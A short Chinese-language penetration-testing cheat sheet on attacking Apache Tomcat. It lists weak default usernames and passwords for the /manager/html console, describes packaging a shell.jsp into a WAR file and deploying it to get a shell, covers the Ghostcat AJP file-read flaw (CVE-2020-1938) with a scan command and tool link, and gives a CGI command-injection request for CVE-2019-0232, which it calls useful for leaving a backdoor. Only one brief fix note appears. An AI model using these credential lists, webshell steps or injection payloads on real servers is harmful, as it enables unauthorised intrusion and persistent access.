---
title: Apache-Tomcat
---

## 应用简介
Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一

## 控制台弱口令

1、访问`ip:8080/manager/html`

用户名

```
tomcat
admin
test
sysadmin
```

密码

```
tomcat
Tomcat

admin
Admin
Admin@123
123456
654321
000000
111111
其它更多自己收集字典~
```

2、部署`war包`getshell

```bash
#shell.jsp单独放置一个目录，命令行下进入当前目录,打包成war包
jar -cvf login.war .\
```

找到 WAR file to deploy 这一项，上传war包后应用即可

## [CVE-2020-1938]-AJP文件包含

**漏洞概述**

```http
#影响版本 8009端口
Apache Tomcat 9.x < 9.0.31
Apache Tomcat 8.x < 8.5.51
Apache Tomcat 7.x < 7.0.100
Apache Tomcat 6.x
```

Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

**漏洞利用**

Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009，用长亭的Xray检测即可

```bash
xray servicescan --target 127.0.0.1:8009
```

一个比较全的Tomcat利用工具-https://github.com/hypn0s/AJPy

- WAR包 上传
- 利用CVE-2020-1938读取文件等

**修复建议**

关闭Tomcat AJP Connector，限制8009端口访问

## [CVE-2019-0232]-远程代码执行（鸡肋-可用来留后门）

**漏洞概述**

```http
#影响版本	条件：{系统为Windows，启用了CGI Servlet（默认为关闭）}
Tomcat 9.0.0~9.0.17
Tomcat 8.5.0~8.5.39
Tomcat 7.0.0~7.0.93
```

由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击

**漏洞利用**

```http
http://localhost:8080/cgi-bin/hello.bat?&net+user
```

https://github.com/pyn3rd/CVE-2019-0232